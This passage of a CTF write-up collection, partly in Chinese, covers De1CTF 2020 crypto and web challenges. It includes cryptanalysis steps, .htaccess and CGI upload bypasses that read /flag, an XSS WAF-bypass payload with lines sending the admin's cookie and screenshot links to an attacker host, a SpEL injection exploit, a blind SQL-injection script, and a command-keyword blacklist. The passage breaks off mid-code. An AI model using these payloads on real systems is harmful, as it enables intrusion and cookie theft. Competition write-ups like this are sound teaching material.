<p>But the task doesn't check whether the given point is on curve. So we can us <a href="https://web-in-security.blogspot.com/2015/09/practical-invalid-curve-attacks.html" target="_blank" rel="noopener">Invalid curve attack</a> to get secret.</p>
<p>We can construct points not on the given curve with low order by using open source software such as <a href="https://github.com/J08nY/ecgen" target="_blank" rel="noopener">ecgen</a> or <a href="https://crypto.stackexchange.com/questions/71065/invalid-curve-attack-finding-low-order-points" target="_blank" rel="noopener">Invalid curve attack algorithm</a> and use CRT to get secret. Then we can use the generated data to attack the task and get flag.</p>
<p>PS: use <em>genData.py</em> to generated <em>data.txt</em> locally and use <span class="math inline">\(exp.py\)</span> to attack this chanllenge.</p>
<p>Reference:</p>
<p><a href="https://en.wikipedia.org/wiki/Elliptic-curve_Diffie–Hellman" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Elliptic-curve_Diffie%E2%80%93Hellman</a></p>
<p>https://crypto.stackexchange.com/questions/71065/invalid-curve-attack-finding-low-order-points</p>
<p>https://web-in-security.blogspot.com/2015/09/practical-invalid-curve-attacks.html</p>
<p>https://www.iacr.org/archive/pkc2003/25670211/25670211.pdf</p>
<p>https://github.com/J08nY/ecgen</p>
<h2><span id="homomorphic">Homomorphic</span></h2>
<p>This is a homomorphic encryption crypto system. We can use CCA to leak secret key and attack it.</p>
<p>Here is the solution:</p>
<ol type="1">
<li><p>Let : <span class="math inline">\(M = \delta/4 + 20\)</span> , where 20 is a number large enough to cover up the noise.</p></li>
<li><p>Let: <span class="math inline">\(t_1 = Mx^i,t2 = M\)</span></p></li>
<li><p>Let ciphertext: <span class="math inline">\(c_0 = pk[0] + t_1,c1 = pk[1]+t_2\)</span></p></li>
<li><p>Send <span class="math inline">\(c = (c0,c1)\)</span> to server</p></li>
<li><p>The server will do this: <span class="math inline">\(c_0+c_1s = pk[0]+t_1+(pk[1]+t_2)s = -(as+e)+t_1+(a+t_2)s=e+t_1+t_2s\)</span></p>
<p>so the decryption result is all 0 except for the i-th bit, and the i-th bit is equal to the i-th bit of secret key <span class="math inline">\(s\)</span></p></li>
<li><p>Append the i-th bit of secret key <span class="math inline">\(s\)</span> to result array and back to step 1 until recover all the bits of secret key <span class="math inline">\(s\)</span></p></li>
<li><p>Use the secret key to decrypt flag</p></li>
</ol>
<p>Also because the task has a decrypt function with bad check function. We can use many other ways to decrypt flag too. Such as add a <span class="math inline">\(q\)</span> to the items of input <span class="math inline">\(c0\)</span> and <span class="math inline">\(c1\)</span>, add other small numbers or etc.</p>
<p>Reference:</p>
<p>https://arxiv.org/pdf/1906.07127.pdf</p>
<p>https://www.slideshare.net/ssuserbd9135/danger-of-using-fully-homomorphic-encryption-a-look-at-microsoft-seal-cansecwest2019</p>
<p>https://github.com/edwardz246003/danger-of-using-homomorphic-encryption</p>
<h2><span id="mini-purε-plus">Mini Purε Plus</span></h2>
<p><a href="https://github.com/De1ta-team/De1CTF2019/tree/master/writeup/crypto/Mini%20Purε" target="_blank" rel="noopener">Mini Purε</a> is the crypto challenge of De1CTF 2019, this year I try to add the <em>ROUND</em> and give you data to attack.</p>
<p>Here is the solution:</p>
<p>Assume the input is <span class="math inline">\((C,x)\)</span> , the output is <span class="math inline">\((C_L,C_R)\)</span>, then we can easily get the coefficients of <span class="math inline">\(x^{3^{m-1}-1}\)</span> and <span class="math inline">\(x^{3^{m-1}-3}\)</span> in <span class="math inline">\(C_R\)</span> is <span class="math inline">\(k0\)</span> and <span class="math inline">\({k0}^3 + k1 + C\)</span> , where <span class="math inline">\(C\)</span> is a constant，<span class="math inline">\(x\)</span> is a variable and <span class="math inline">\(k0,k1\)</span> are the first and second round keys.</p>
<p>So we can use <a href="https://en.wikipedia.org/wiki/Integral_cryptanalysis" target="_blank" rel="noopener">Square attack</a> to find this: <span class="math display">\[
\sum_{x\in F_{2^n}}x^{2^{n} - 3^{m-1}}C_R(x) = k0
\]</span></p>
<p><span class="math display">\[
\sum_{x\in F_{2^n}}x^{2^{n} - 3^{m-1}-2}C_R(x) = k0^3 + k1 + C
\]</span></p>
<p>where <span class="math inline">\(n=24,m=16\)</span></p>
<p>Then we can get <span class="math inline">\(k0,k1\)</span> and get all keys to decrypt flag.</p>
<p>And thanks to <a href="https://redbud.info/ctfteam.html" target="_blank" rel="noopener">Redbud</a>, they provided an improved interpolation attack method. It also works.</p>
<p>Reference:</p>
<p>https://en.wikipedia.org/wiki/Integral_cryptanalysis</p>
<p>https://link.springer.com/content/pdf/10.1007%2F978-3-642-03317-9_11.pdf</p>
<h2><span id="ov">OV</span></h2>
<p>This is a balanced oil and vinegar scheme. And it has been attacked by <a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.120.9564&amp;rep=rep1&amp;type=pdf" target="_blank" rel="noopener">Kipnis and Shamir in 1998</a>.</p>
<p>So we can just use Kipnis-Shamir attack to solve this task.</p>
<p>However I made some mistakes in the <em>hashFunction</em>. It should be like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H = [K.fetch_int(ord(i)) <span class="keyword">for</span> i <span class="keyword">in</span> m]</span><br></pre></td></tr></table></figure>
<p>But I write it like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H = [ord(i) <span class="keyword">for</span> i <span class="keyword">in</span> m]</span><br></pre></td></tr></table></figure>
<p>So there is a unexpected solution: just send <em>Iwanttoknowflag!</em> to sign and send the signed data to get flag.</p>
<p>And thanks to <a href="https://github.com/samueltangz" target="_blank" rel="noopener">Mystiz</a> , he helped me to find out the unexpected solution and improve my solution scripts.</p>
<p>Also thanks to <a href="https://github.com/hellman" target="_blank" rel="noopener">Hellman</a>, he reminded me of this mistake too.</p>
<p>Here is the excepted solution:</p>
<pre><code>We assume public key is $P: k^n \rightarrow k^o$ , where $o = v = 16,n = o+v$</code></pre>
<ol type="1">
<li>Produce the corresponding symmetric matrices for the homogeneous quadratic parts of public key's polynomials: <span class="math inline">\(W_1,W_2,...,W_o\)</span>. Randomly choose two linear combination of <span class="math inline">\(W_1,W_2,...,W_o\)</span> and still denote them as <span class="math inline">\(W_1\)</span> and <span class="math inline">\(W_2\)</span> in which <span class="math inline">\(W_1,W_2\)</span> is invertible. Calculate <span class="math inline">\(W_{12} = W_1 * W^{-1}_2\)</span>.</li>
<li>Compute the characteristic polynomial of <span class="math inline">\(W_{12}\)</span> and find its linear factor of multiplicity 1. Denote such factor as <span class="math inline">\(h(x)\)</span>. Compute <span class="math inline">\(h(W_{12})\)</span> and its corresponding kernel.</li>
<li>For each vector <span class="math inline">\(O\)</span> in the kernel of step 2, use <span class="math inline">\(OW_iO=0\)</span>, <span class="math inline">\((1 \leq i \leq o)\)</span> to test if <span class="math inline">\(O\)</span> belongs to the hidden oil space. Choose linear dependent vectors among them and append them to set <span class="math inline">\(T\)</span>.</li>
<li>If <span class="math inline">\(T\)</span> contains only one vector or nothing, go back to step 1.</li>
<li>If necessary, find more vectors in <span class="math inline">\(T:O_3,O_4,...\)</span> Calculate <span class="math inline">\(K_{O_1} \bigcap ... \bigcap K_{O_t}\)</span> to find out the hidden Oil space in which <span class="math inline">\(K_{O_t}\)</span> is a space from which the vectors <span class="math inline">\(x\)</span> satisfy that <span class="math inline">\(O_tW_ix=0\)</span>, <span class="math inline">\((1 \leq i \leq o)\)</span>.</li>
<li>Extract a basis of hidden Oil space and extend it to a basis of <span class="math inline">\(k^n\)</span> and use it to transform the public key polynomials to basic Oil-Vinegar polynomials form.</li>
</ol>
<p>This write up doesn't write the whole content of Kipnis-Shamir attack, if you are interesting in it, you can see the papers in reference. Thanks.</p>
<p>PS: I have fixed these mistakes including word spelling mistake and generated the new source code. You can try to solve this task.</p>
<p>Reference:</p>
<p>http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.120.9564&amp;rep=rep1&amp;type=pdf</p>
<p>https://link.springer.com/content/pdf/10.1007%2F978-3-642-03317-9_11.pdf</p>
<p>https://link.springer.com/chapter/10.1007/978-3-319-38898-4_4</p>
<p>https://github.com/dsm501/Multivariate-cryptography-/blob/master/UOV%20Scheme.sagews</p>
<h2><span id="mc_noisemap">mc_noisemap</span></h2>
<p>Files: <a href="https://pastebin.com/P6YuDdBF" target="_blank" rel="noopener">exp.js</a> <a href="https://pastebin.com/gqwxugFC" target="_blank" rel="noopener">package.json</a> <a href="https://pastebin.com/vngikVFN" target="_blank" rel="noopener">www/map.html</a> <a href="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js" target="_blank" rel="noopener">www/assets/jquery.min.js</a> <a href="https://pastebin.com/EDna6NcL" target="_blank" rel="noopener">www/assets/noisemap.js</a> <a href="https://cdnjs.cloudflare.com/ajax/libs/p5.js/0.9.0/addons/p5.dom.js" target="_blank" rel="noopener">www/assets/p5.dom.js</a> <a href="https://cdnjs.cloudflare.com/ajax/libs/p5.js/0.9.0/p5.js" target="_blank" rel="noopener">www/assets/p5.js</a></p>
<p>The challenge is about <code>Image Identification</code>, modified basing on <a href="https://github.com/erdavids/Hex-Map" target="_blank" rel="noopener">erdavids/Hex-Map</a>.</p>
<p>My solution is not perfect. Perhaps there are some good ways to solve the challenge, I believe.</p>
<p>Just have a check on the exploit file <code>exp.js</code>.</p>
<p><code>De1CTF{MCerrr_L0v3_P3r1iN_N0IsE-M4p?}</code></p>
<h1><span id="web">web</span></h1>
<h2><span id="check-in">check in</span></h2>
<p><strong>本题考查点</strong>： 1.<code>.htaccess</code>文件的利用 2.linux环境下CGI的利用 文件上传时注意的几点: - MIME(content-type字段)校验 - 后缀名黑名单校验(<code>/ph|ml|js|cg/</code>) - 文件内容校验 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/perl|pyth|ph|auto|curl|base|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet/</span><br></pre></td></tr></table></figure></p>
<p><strong>预期解</strong> .htaccess: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .xx</span><br></pre></td></tr></table></figure></p>
<p>1.xx: <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> Content-type: text/html</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">""</span></span><br><span class="line"></span><br><span class="line">cat /flag</span><br></pre></td></tr></table></figure></p>
<p>注：这里讲下一个小坑，linux中cgi比较严格(2333333) 上传后发现状态码500，无法解析我们bash文件。因为我们的目标站点是linux环境，如果我们用(windows等)本地编辑器编写上传时编码不一致导致无法解析，所以我们可以在linux环境中编写并导出再上传。</p>
<p><strong>非预期解 1</strong> 惨痛的教训 ！！！ 出题时坑有点多，所以忘记了<a href="https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/Ezphp" target="_blank" rel="noopener">2019xnuca中的ezphp</a>,所以许多师傅就利用<code>\</code>绕过了waf! (wtclll!!) .htaccess: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-p\</span><br><span class="line">hp .xx</span><br></pre></td></tr></table></figure></p>
<p>1.xx <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=<span class="string">'cat /flag'</span>;</span><br></pre></td></tr></table></figure></p>
<p><strong>非预期解 2</strong> 利用apache的服务器状态信息(默认关闭) .htaccess: <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler server-status</span><br></pre></td></tr></table></figure></p>
<p>上传文件后，访问自己的目录就发现是apache的服务器状态信息，可以看到其他人的访问本网站的记录，可以利用次方法，可以白嫖flag。</p>
<h2><span id="animal-crossing">Animal crossing</span></h2>
<p>题目描述：</p>
<p>免费创建护照来展示你的岛屿！</p>
<h3><span id="第一关绕过云waf">第一关：绕过云WAF</span></h3>
<p>云WAF通常有好几层好几种过滤手段，这里我也是设计了了两层防护</p>
<h4><span id="第一层黑名单检测">第一层：黑名单检测</span></h4>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> blackList = []<span class="keyword">string</span>&#123;</span><br><span class="line">    <span class="comment">//global</span></span><br><span class="line">    <span class="string">"document"</span>, <span class="string">"window"</span>, <span class="string">"top"</span>, <span class="string">"parent"</span>, <span class="string">"global"</span>, <span class="string">"this"</span>,</span><br><span class="line">    <span class="comment">//func</span></span><br><span class="line">    <span class="string">"console"</span>, <span class="string">"alert"</span>, <span class="string">"log"</span>, <span class="string">"promise"</span>, <span class="string">"fetch"</span>, <span class="string">"eval"</span>, <span class="string">"import"</span>,</span><br><span class="line">    <span class="comment">//char</span></span><br><span class="line">    <span class="string">"&lt;"</span>, <span class="string">"&gt;"</span>, <span class="string">"`"</span>, <span class="string">"\\*"</span>, <span class="string">"&amp;"</span>, <span class="string">"#"</span>, <span class="string">"%"</span>, <span class="string">"\\\\"</span>,</span><br><span class="line">    <span class="comment">//key</span></span><br><span class="line">    <span class="string">"if"</span>, <span class="string">"set"</span>, <span class="string">"get"</span>, <span class="string">"with"</span>, <span class="string">"yield"</span>, <span class="string">"async"</span>, <span class="string">"wait"</span>, <span class="string">"func"</span>, <span class="string">"for"</span>, <span class="string">"error"</span>, <span class="string">"string"</span>,</span><br><span class="line">    <span class="comment">//string</span></span><br><span class="line">    <span class="string">"href"</span>, <span class="string">"location"</span>, <span class="string">"url"</span>, <span class="string">"cookie"</span>, <span class="string">"src"</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>黑名单的绕过思路无非避开被ban的字符串和字符，这里因为go的iris框架问题（看不出来是golang吧），导致<code>;</code>后的东西会被删掉，可以用%0a绕过</p>
<h4><span id="第二层静态语法分析">第二层：静态语法分析</span></h4>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 将data传入`fmt.Sprintf(&quot;&apos;%s&apos;;&quot;, data)`，然后进行语法解析，这里parse失败直接ban</span><br><span class="line">2. 接着遍历AST进行分析：</span><br><span class="line">   1. VariableExpression/AssignExpression，所有声明语句/赋值语句直接ban</span><br><span class="line">   2. CallExpression，所有函数调用的，且callee不为Identifier的直接ban</span><br><span class="line">      1. ban：`test.test()`、`a[x]()`</span><br><span class="line">      2. pass：`test()`</span><br><span class="line">   3. BracketExpression，也就是成员引用，Member不为Identifier的直接ban，</span><br><span class="line">      1. ban：`a[1]`、`a[&apos;xx&apos;]`</span><br><span class="line">      2. pass：`a[x]`</span><br></pre></td></tr></table></figure>
<p>这一层waf，其实只要摸清ban的套路，针对性找到没被处理的语法来绕过即可，这里我的预期解是用throw传递变量，但是还有很多其他能用的语法（事实证明确实有很多</p>
<p>预期解payload：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=base64code<span class="string">'%0atry&#123;throw '</span>ev<span class="string">'%2b'</span>al<span class="string">'&#125;catch(e)&#123;try&#123;throw frames[e]&#125;catch(c)&#123;c(atob(data))&#125;&#125;%0a//</span></span><br></pre></td></tr></table></figure>
<p>绕过WAF的两层防护之后本地能成功alert就可以用</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = <span class="string">"http://xxxx/?"</span> + btoa(ducument.cookie)</span><br></pre></td></tr></table></figure>
<p>打到管理员cookie了，cookie中包含一半的flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG=De1CTF&#123;I_l1k4_</span><br></pre></td></tr></table></figure>
<h3><span id="第二关读取400张图片">第二关：读取400张图片</span></h3>
<p>另外一半flag，题目给了hint：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">管理员在做什么?</span><br></pre></td></tr></table></figure>
<p>读取管理员的document，会发现有400多张png图片，flag就藏在这些图片当中，这里设计的时候预设了下面几种解法：</p>
<ol type="1">
<li>绕过CSP引入截图库，截图后把图片传到/upload，获取图片地址回传，然后下载图片</li>
<li>用for循环把400个图全部传到/upload，获取400个图片地址然后回传</li>
<li>直接读取图片回传，可以是写脚本一张一张传，也可以是用for循环批量传，但是回传过程需要编码转换，传回去后也需要再转成图片进行拼接</li>
</ol>
<p>三种方法有简单的也有复杂的，国外三支队伍用的都是第三种，把所有图片dump出去（我猜大佬们没发现/upload接口 23333），而国内的选手用的是解法2，下面我详细介绍下绕过CSP引入截图库的解法，其他的方法也是类似，就不全写出来了（感兴趣的可以去看解出来的大佬们的wp）。</p>
<h4><span id="绕过csp引入截图库">绕过CSP引入截图库</span></h4>
<p>本题的主要功能是制造动森护照，主页是有一个上传文件接口的，利用/upload接口，可以上传任意png后缀的文件，然后用fetch读这个png文件，再eval一下，就可以绕过CSP引入html2canvas库并且执行了，上传的png文件如下</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    ...</span><br><span class="line">  ...</span><br><span class="line">html2canvas.js代码</span><br><span class="line">    ...</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="comment">// 截图-&gt;上传到upload-&gt;外传图片地址</span></span><br><span class="line">html2canvas(<span class="built_in">document</span>.body).then(<span class="function"><span class="keyword">function</span>(<span class="params">canvas</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> form = <span class="keyword">new</span> FormData(),</span><br><span class="line">        url = <span class="string">"/upload"</span>,</span><br><span class="line">        blob = <span class="keyword">new</span> Blob([canvas.toDataURL().toString()], &#123;<span class="attr">type</span> : <span class="string">"image/png"</span>&#125;)</span><br><span class="line">        file = <span class="keyword">new</span> File([blob], <span class="string">"a.png"</span>)</span><br><span class="line">        form.append(<span class="string">"file"</span>, file)</span><br><span class="line">        fetch(url, &#123;</span><br><span class="line">            method: <span class="string">"POST"</span>,</span><br><span class="line">            body: form</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">response</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> response.json()</span><br><span class="line">        &#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            location.href=<span class="string">"//xxxxxxxxx:8099/?"</span>+data.data.toString()</span><br><span class="line">        &#125;)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure>
<p>这里我把截图操作的js也写到png里了，主要思路就是截图完用/upload传到服务器，获取返回的图片地址回传给攻击者</p>
<h4><span id="读取图片并执行">读取图片并执行</span></h4>
<p>把图片用/upload接口上传后，获取png地址，再用可控的js部分去读取这个图片再执行即可</p>
<p>读取并执行的代码如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">`/static/images/xxxxxxxxx.png`</span>).then(<span class="function"><span class="params">res</span>=&gt;</span>res.text()).then(<span class="function"><span class="params">txt</span>=&gt;</span><span class="built_in">eval</span>(txt))</span><br></pre></td></tr></table></figure>
<p>用绕过第一关的办法包装一下就可以了</p>
<p>最后提交到bot就能接收到管理员界面截图的地址了，直接下载就能看到另一半flag了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cool_GamE&#125;</span><br></pre></td></tr></table></figure>
<p>最后flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">De1CTF&#123;I_l1k4_cool_GamE&#125;</span><br></pre></td></tr></table></figure>
<h2><span id="calc">calc</span></h2>
<h3><span id="1-challenge-info">1. challenge info</span></h3>
<p>Please calculate the content of file /flag http://106.52.164.141</p>
<h3><span id="2-design-document">2. design document</span></h3>
<p>I found there are many difference between spel's grammar and java's grammar. For example, in spel we can use 1.class to get the class java.lang.Integer, but in java, we cannot.</p>
<p>I want to design a challenge to let ctfers discovery these difference and construct a more complicated reflection chain instead of the copy the payload from the internet directly.</p>
<p>So, i use two technology to forbide normal payloads.</p>
<ol type="1">
<li>blacklist filter:
<ul>
<li>T(</li>
<li>#</li>
<li>new</li>
<li>java.lang</li>
<li>Runtime</li>
<li>exec.*(</li>
<li>getRuntime</li>
<li>ProcessBuilder</li>
<li>start</li>
<li>getClass</li>
<li>String</li>
</ul></li>
<li>rasp</li>
</ol>
<p>There may be 3 different way to solve: 1. bypass blacklist filter to use T or # or new keywords 2. bypass blacklist by using 1.class.forName() to reflect java class, and construct a reflection chain to get flag 3. close the rasp protection</p>
<h3><span id="3-exp">3. exp</span></h3>
<p>which scheme we want players to use is the scheme2:bypass blacklist by using 1.class.forName() to reflect java class, and construct a reflection chain to get flag. and i just give my exploit here. of course you can try other two schemes to solve this challenge (actually they are really feasible.)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">import commands</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def get_flag(target):</span><br><span class="line">    payload = &apos;1.class.forName(&quot;java.nio.file.Files&quot;).getMethod(&quot;readAllLines&quot;, 1.class.forName(&quot;java.nio.file.Path&quot;)).invoke(null, 1.class.forName(&quot;java.nio.file.Paths&quot;).getMethod(&quot;get&quot;, 1.class.forName(&quot;java.net.URI&quot;)).invoke(null, 1.class.forName(&quot;java.net.URI&quot;).getMethod(&quot;create&quot;, 1.class.forName(&quot;java.la&quot;+&quot;ng.Str&quot;+&quot;ing&quot;)).invoke(null, &quot;file:///flag&quot;)))&apos;</span><br><span class="line">    print(&quot;payload&quot;, payload)</span><br><span class="line">    url = &quot;http://&#123;&#125;/spel/calc&quot;.format(target)</span><br><span class="line">    r = requests.get(url, params=&#123;&quot;calc&quot;: payload&#125;)</span><br><span class="line">    print(r.request.url)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    get_flag(&quot;106.52.164.141&quot;)</span><br></pre></td></tr></table></figure>
<h3><span id="4-other-writeups">4. other writeups</span></h3>
<p>I am ashamed that there are more detailed writeups written by players. you can find here: https://ctftime.org/task/11491</p>
<h2><span id="mixture">mixture</span></h2>
<p>登陆进去之后发现member.php有<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```python</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://49.51.251.99/index.php&quot;</span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;username&quot;:&quot;xxxxx&quot;,</span><br><span class="line">    &quot;password&quot;:&quot;xxxxxxx&quot;,</span><br><span class="line">    &quot;submit&quot;:&quot;submit&quot;</span><br><span class="line">&#125;</span><br><span class="line">cookie =&#123;</span><br><span class="line">    &quot;PHPSESSID&quot;: &quot;sou26piclav6f99h79k1l5vmbn&quot;</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url,data=data,cookies=cookie)</span><br><span class="line">flag=&apos;&apos;</span><br><span class="line">url=&quot;http://49.51.251.99/member.php?orderby=&quot;</span><br><span class="line">for i in range(1,33):</span><br><span class="line">    for j in &apos;0123456789abcdefghijklmnopqrstuvwxyz,&apos;:</span><br><span class="line">        payload=&quot;|(mid((select password from member),&#123;&#125;,1)=&apos;&#123;&#125;&apos;)%2b1&quot;.format(i,j)</span><br><span class="line">        true_url=url+payload</span><br><span class="line">        r=requests.get(true_url,cookies=cookie)</span><br><span class="line">        if r.content.index(&apos;tom&apos;)&lt;r.content.index(&apos;1000000&apos;):</span><br><span class="line">            print payload+&apos; ok&apos;</span><br><span class="line">            flag+=j</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            print payload</span><br><span class="line">//18a960a3a0b3554b314ebe77fe545c85</span><br></pre></td></tr></table></figure></p>
<p>跑出来的密码经过md5解密是goodlucktoyou</p>
<p>search.php中调用的Minclude函数对应了Minclude.so中的zip_Minclude函数</p>
<p>直接反编译会发现没有什么东西，看一下汇编会看到几句简单的花指令干扰了分析。patch一下把这些花指令去除后，函数的功能十分简单：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">zif_Minclude</span><span class="params">(zend_execute_data *execute_data, zval *return_value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *fp; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  zend_value v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *parameter; <span class="comment">// [rsp+0h] [rbp-98h]</span></span><br><span class="line">  <span class="keyword">size_t</span> length; <span class="comment">// [rsp+8h] [rbp-90h]</span></span><br><span class="line">  <span class="keyword">char</span> path[<span class="number">96</span>]; <span class="comment">// [rsp+10h] [rbp-88h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+70h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// [rsp+74h] [rbp-24h]</span></span><br><span class="line"></span><br><span class="line">  parameter = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">memset</span>(path, <span class="number">0</span>, <span class="keyword">sizeof</span>(path));</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = path;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)zend_parse_parameters(execute_data-&gt;This.u2.next, <span class="string">"s"</span>, &amp;parameter, &amp;length) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(path, parameter, length);</span><br><span class="line">    php_printf(<span class="string">"%s"</span>, path);</span><br><span class="line">    php_printf(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">    fp = fopen(path, <span class="string">"rb"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( fp )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( !feof(fp) )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = fgetc(fp);</span><br><span class="line">        php_printf(<span class="string">"%c"</span>, v3);</span><br><span class="line">      &#125;</span><br><span 